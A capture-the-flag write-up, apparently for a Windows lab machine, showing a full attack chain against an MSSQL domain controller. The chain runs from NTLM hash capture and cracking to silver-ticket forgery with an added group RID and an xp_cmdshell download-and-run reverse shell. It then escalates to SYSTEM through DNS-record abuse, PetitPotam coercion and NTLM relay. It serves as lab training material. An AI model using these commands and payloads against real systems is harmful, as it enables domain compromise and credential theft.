

## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: MSSQL Sliver Ticket
- Privilege escalation: NTLM Relay 

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.242.173 -p- -sC -sV -A
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 23:08 -0700
Nmap scan report for 10.129.242.173
Host is up (0.13s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info:
|   10.129.242.173:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-06-06T06:09:18
|_Not valid after:  2056-06-06T06:09:18
|_ssl-date: 2026-06-06T06:38:54+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   10.129.242.173:1433:
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
```
- We are given credential `scott : Sm230#C5NatH`
- Enumerate domain accounts and groups using `nxc`
```
$ nxc mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth --rid-brute
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
MSSQL       10.129.242.173  1433   DC01             498: SIGNED\Enterprise Read-only Domain Controllers
MSSQL       10.129.242.173  1433   DC01             500: SIGNED\Administrator
MSSQL       10.129.242.173  1433   DC01             501: SIGNED\Guest
MSSQL       10.129.242.173  1433   DC01             502: SIGNED\krbtgt
MSSQL       10.129.242.173  1433   DC01             512: SIGNED\Domain Admins
MSSQL       10.129.242.173  1433   DC01             513: SIGNED\Domain Users
MSSQL       10.129.242.173  1433   DC01             514: SIGNED\Domain Guests
MSSQL       10.129.242.173  1433   DC01             515: SIGNED\Domain Computers
MSSQL       10.129.242.173  1433   DC01             516: SIGNED\Domain Controllers
MSSQL       10.129.242.173  1433   DC01             517: SIGNED\Cert Publishers
MSSQL       10.129.242.173  1433   DC01             518: SIGNED\Schema Admins
MSSQL       10.129.242.173  1433   DC01             519: SIGNED\Enterprise Admins
MSSQL       10.129.242.173  1433   DC01             520: SIGNED\Group Policy Creator Owners
MSSQL       10.129.242.173  1433   DC01             521: SIGNED\Read-only Domain Controllers
MSSQL       10.129.242.173  1433   DC01             522: SIGNED\Cloneable Domain Controllers
MSSQL       10.129.242.173  1433   DC01             525: SIGNED\Protected Users
MSSQL       10.129.242.173  1433   DC01             526: SIGNED\Key Admins
MSSQL       10.129.242.173  1433   DC01             527: SIGNED\Enterprise Key Admins
MSSQL       10.129.242.173  1433   DC01             553: SIGNED\RAS and IAS Servers
MSSQL       10.129.242.173  1433   DC01             571: SIGNED\Allowed RODC Password Replication Group
MSSQL       10.129.242.173  1433   DC01             572: SIGNED\Denied RODC Password Replication Group
MSSQL       10.129.242.173  1433   DC01             1000: SIGNED\DC01$
MSSQL       10.129.242.173  1433   DC01             1101: SIGNED\DnsAdmins
MSSQL       10.129.242.173  1433   DC01             1102: SIGNED\DnsUpdateProxy
MSSQL       10.129.242.173  1433   DC01             1103: SIGNED\mssqlsvc
MSSQL       10.129.242.173  1433   DC01             1104: SIGNED\HR
MSSQL       10.129.242.173  1433   DC01             1105: SIGNED\IT
MSSQL       10.129.242.173  1433   DC01             1106: SIGNED\Finance
MSSQL       10.129.242.173  1433   DC01             1107: SIGNED\Developers
MSSQL       10.129.242.173  1433   DC01             1108: SIGNED\Support
MSSQL       10.129.242.173  1433   DC01             1109: SIGNED\oliver.mills
MSSQL       10.129.242.173  1433   DC01             1110: SIGNED\emma.clark
MSSQL       10.129.242.173  1433   DC01             1111: SIGNED\liam.wright
MSSQL       10.129.242.173  1433   DC01             1112: SIGNED\noah.adams
MSSQL       10.129.242.173  1433   DC01             1113: SIGNED\ava.morris
MSSQL       10.129.242.173  1433   DC01             1114: SIGNED\sophia.turner
MSSQL       10.129.242.173  1433   DC01             1115: SIGNED\james.morgan
MSSQL       10.129.242.173  1433   DC01             1116: SIGNED\mia.cooper
MSSQL       10.129.242.173  1433   DC01             1117: SIGNED\elijah.brooks
MSSQL       10.129.242.173  1433   DC01             1118: SIGNED\isabella.evans
MSSQL       10.129.242.173  1433   DC01             1119: SIGNED\lucas.murphy
MSSQL       10.129.242.173  1433   DC01             1120: SIGNED\william.johnson
MSSQL       10.129.242.173  1433   DC01             1121: SIGNED\charlotte.price
MSSQL       10.129.242.173  1433   DC01             1122: SIGNED\henry.bennett
MSSQL       10.129.242.173  1433   DC01             1123: SIGNED\amelia.kelly
MSSQL       10.129.242.173  1433   DC01             1124: SIGNED\jackson.gray
MSSQL       10.129.242.173  1433   DC01             1125: SIGNED\harper.diaz
MSSQL       10.129.242.173  1433   DC01             1126: SIGNED\SQLServer2005SQLBrowserUser$DC01
```
## Foothold

#### Steps
- There is only one port running on target which is the `mssql` service
- Attempt to login to `mssql` using `impacket-mssqlclient`
```
impacket-mssqlclient 'scott:Sm230#C5NatH@10.129.242.173'
```
- Enumerate the database and found that we are able to run `xp_diretree` however unable to list any files 
```

SQL (scott  guest@msdb)> xp_dirtree \
subdirectory   depth   file
------------   -----   ----
```
- We can attempt to perform NTLM hash steal by coerce  the `mssql` instance to access to our smb server
- Start `responder`
```
$ sudo responder -I tun0
```
- Run `xp_diretree` to point to our IP address 
```
SQL (scott  guest@msdb)> exec xp_dirtree '\\10.10.14.6\share\file'
subdirectory   depth
------------   -----
```
- We get NTLMv2 hash of `mssqlsvc` account
```
$ sudo responder -I tun0
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:e11937a4caa2087d:B920132A711A38A739308D0EC3CBBE94:010100000000000080AD126748F5DC017522C0F8B779385F000000000200080048004A004E00440001001E00570049004E002D004F005600590032004D003300360048004D0049004C0004003400570049004E002D004F005600590032004D003300360048004D0049004C002E0048004A004E0044002E004C004F00430041004C000300140048004A004E0044002E004C004F00430041004C000500140048004A004E0044002E004C004F00430041004C000700080080AD126748F5DC0106000400020000000800300030000000000000000000000000300000DACB69559F61287A52D0D325AE63428DBC582A05543AF057C738CFDA0985A0F70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```
- Use hashcat to decrypt the hash and recovered the plaintext password
```
$ hashcat hash  /usr/share/wordlists/rockyou.txt
<SNIP>
MSSQLSVC::SIGNED:e11937a4caa2087d:b920132a711a38a739308d0ec3cbbe94:010100000000000080ad126748f5dc017522c0f8b779385f000000000200080048004a004e00440001001e00570049004e002d004f005600590032004d003300360048004d0049004c0004003400570049004e002d004f005600590032004d003300360048004d0049004c002e0048004a004e0044002e004c004f00430041004c000300140048004a004e0044002e004c004f00430041004c000500140048004a004e0044002e004c004f00430041004c000700080080ad126748f5dc0106000400020000000800300030000000000000000000000000300000dacb69559f61287a52d0d325ae63428dbc582a05543af057c738cfda0985a0f70a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0036000000000000000000:purPLE9795!@
```
- Confirm the account validity with `nxc`
```
$ nxc mssql 10.129.242.173 -u mssqlsvc -p 'purPLE9795!@'
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
```
- Login to `impacket-mssqlclient` with the service account 
- Enumerate the file system and unable to recover useful information
```
$ impacket-mssqlclient 'mssqlsvc:purPLE9795!@@10.129.242.173' -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```
- Since we have obtain the MSSQL service account we can attempt to perform a sliver ticket 
- First we will need to find the domain SID, we can obtain it by running the `SUSER_SID` command.
- Supply the command with a domain user e.g. administrator 
```
SQL (SIGNED\mssqlsvc  guest@msdb)>  SELECT SUSER_SID('SIGNED\Administrator');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'
```
- The output is in binary format we will need to convert it in readable format using below python script
```
sid_bytes = bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000')
rev, count = sid_bytes[0], sid_bytes[1]
auth = int.from_bytes(sid_bytes[2:8], 'big')
subs = [int.from_bytes(sid_bytes[8+i*4:8+i*4+4], 'little') for i in range(count)]
sid_string = f'S-{rev}-{auth}' + ''.join(f'-{s}' for s in subs)
print(sid_string)
```
- Output: `S-1-5-21-4088429403-1159899800-2753317549-500`
- The domain SID will be `S-1-5-21-4088429403-1159899800-2753317549`
- Next we will need to convert the plaintext password to NT hash
```
pypykatz crypto nt 'purPLE9795!@'

ef699384c3285c54128a3ee1ddb1a0cc
```
- Finally we can create a sliver ticket of the domain administrator user
```
$ impacket-ticketer -spn MSSQLSvc/dc01.signed.htb -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -nthash ef699384c3285c54128a3ee1ddb1a0cc -dc-ip 10.129.242.173 -domain signed.htb Administrator

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
- We can use the ticket to authenticate to MSSQL 
```
$ export KRB5CCNAME=Administrator.ccache 
$ impacket-mssqlclient -k dc01.signed.htb
```
- Enumerate the database and found that we still dont have administrator permission over the MSSQL service. 
```
$ impacket-mssqlclient -k dc01.signed.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  guest@master)>
```
- Let's enumerate which users have administrative access.
```
SQL (SIGNED\Administrator  guest@master)> SELECT sp.name, sl.name AS LoginName FROM sys.server_role_members rm JOIN sys.server_principals sp ON rm.role_principal_id = sp.principal_id JOIN sys.server_principals sl ON rm.member_principal_id = sl.principal_id WHERE sp.name = 'sysadmin';
name       LoginName
--------   -------------------------
sysadmin   sa
sysadmin   SIGNED\IT
sysadmin   NT SERVICE\SQLWriter
sysadmin   NT SERVICE\Winmgmt
sysadmin   NT SERVICE\MSSQLSERVER
sysadmin   NT SERVICE\SQLSERVERAGENT
```
- We can see an entry for the SIGNED\IT group with sysadmin privileges. 
- This means users in the IT group have the sysadmin role on this MSSQL instance. So, instead of using the Administrator user, we can impersonate the IT group so that when we log in, we have sysadmin privileges.
- We dont know the user inside of the `SIGNED\IT` group and no access to AD services
- The way MSSQL figures out if a certain user is inside a specific group is from the PAC, so if we can create a PAC with the RID of the SIGNED\IT group
-  Find out the SID of the group `SIGNED\IT`
```
SQL (SIGNED\Administrator  guest@master)> SELECT SUSER_SID('SIGNED\IT');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```
- Convert to readable format
```
sid_bytes = bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000')
rev, count = sid_bytes[0], sid_bytes[1]
auth = int.from_bytes(sid_bytes[2:8], 'big')
subs = [int.from_bytes(sid_bytes[8+i*4:8+i*4+4], 'little') for i in range(count)]
sid_string = f'S-{rev}-{auth}' + ''.join(f'-{s}' for s in subs)
print(sid_string)

S-1-5-21-4088429403-1159899800-2753317549-1105
```
- When we forge a ticket (golden or silver), we can **add extra group SIDs** using the `-group` flag. The value `1105` is a **Relative Identifier (RID)** – the last part of a full SID.
- If that custom group has been granted local administrator rights on the target SQL server, or has been delegated `sysadmin` role in SQL Server, then adding RID 1105 to your ticket makes the forged `Administrator` appear as a **member of that group** – even though the real Administrator may not be a member.
- Generate a sliver ticket with administrator user in IT group
```
impacket-ticketer -spn MSSQLSvc/dc01.signed.htb -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -nthash ef699384c3285c54128a3ee1ddb1a0cc -dc-ip 10.129.242.173 -domain signed.htb -group 1105 Administrator
```
- Authenticate to MSSQL and we are an administrator 
```
$ export KRB5CCNAME=Administrator.ccache

$ impacket-mssqlclient -k dc01.signed.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  dbo@master)>
```
- We can use `xp_cmdshell` to obtain shell access, enable the `cmdshell` first 
```
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```
- Call and execute `Invoke-PowerShellTcp.ps1` or `Invoke-ConPtyShell.ps1`
```
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.6:8000/Invoke-PowerShellTcp.ps1\");
```
- We have shell access to target
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.242.173] 50014
Windows PowerShell running as user mssqlsvc on DC01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
signed\mssqlsvc
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Enumerate target with `winpeas.bat` and identified internal facing ports 
```
[+] USED PORTS
   [i] Check for services restricted from the outside
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4816
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2404
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1184
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1560
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING       1692
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49681          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49736          0.0.0.0:0              LISTENING       2716
  TCP    0.0.0.0:50151          0.0.0.0:0              LISTENING       896
```
- Set up chisel for port forwarding 
```
$ ./chisel server -p 8001 --reverse
2026/06/06 01:21:17 server: Reverse tunnelling enabled
2026/06/06 01:21:17 server: Fingerprint eL/CMs/lb6BSfBhlLIw8SJsbCL1e3BBM7yTPO5jg2wE=
2026/06/06 01:21:17 server: Listening on http://0.0.0.0:8001
2026/06/06 01:22:01 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```
PS C:\temp> ./chisel.exe client 10.10.14.6:8001 R:socks
./chisel.exe client 10.10.14.6:8001 R:socks
2026/06/06 01:22:00 client: Connecting to ws://10.10.14.6:8001
2026/06/06 01:22:01 client: Connected (Latency 165.2725ms)
```
- Check we have access to internal facing ports with `nxc`
```
$ sudo proxychains nxc smb 10.129.242.173 -u mssqlsvc -p 'purPLE9795!@'
[sudo] password for kali:
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.129.242.173:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.129.242.173:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.129.242.173:135  ...  OK
SMB         10.129.242.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.129.242.173:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.129.242.173:445  ...  OK
SMB         10.129.242.173  445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
```
- Due to that **Active Directory Integrated DNS** (ADIDNS) is configured to allow **any authenticated user in the domain** to create new DNS records 
- we can attempt register a **new DNS A record** with a name containing a **specifically crafted, 44-byte string** (`1UWhRC...`) that points to our IP address, e.g. `10.10.16.7`. This string is the marshaled `CREDENTIAL_TARGET_INFORMATIONW` structure that, when decoded by Windows, instructs the Kerberos client to authenticate to a different service
- First set up `ntlmrelayx`
```
$  proxychains -q ntlmrelayx.py -t winrms://10.129.242.173 -smb2support
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled
```
- Then add a DNS record
```
$ sudo proxychains -q python3 ./dnstool.py \
  -u 'SIGNED.HTB\mssqlsvc' \
  -p 'purPLE9795!@' \
  -a add \
  -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
  -d 10.10.14.6 \
  --tcp \
  10.129.242.173
[sudo] password for kali:
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully
```
- Using `netexec` and the `coerce_plus` module, we can forces the Domain Controller to **connect to the malicious DNS record** we created. Because of the malicious DNS record, the DC’s Kerberos client is tricked into building an altered SPN that contains the our marshaled data
- **NOTE**: Might have to try a few times to work
```
$ sudo proxychains -q nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=Petit
SMB         224.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         224.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
COERCE_PLUS 224.0.0.1       445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 224.0.0.1       445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile
```
- Receive a connection
```
$  proxychains -q ntlmrelayx.py -t winrms://10.129.242.173 -smb2support
<SNIP>
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://10.129.242.173
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://10.129.242.173 SUCCEED [1]
[*] winrms:///@10.129.242.173 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] All targets processed!
[*] (SMB): Connection from 10.129.242.173 controlled, but there are no more targets left!
```
- Visit port 11000 to obtain shell access to target as `nt authority\system`
```
$ nc 127.0.0.1 11000
Type help for list of commands

# whoami
nt authority\system
```
## Lessons Learned
- Attack family:
- Key takeaway:
	- Learned exploit MSSQL in a restricted environment  
	- Practice on NTLM relay attacks

## Resources
- References: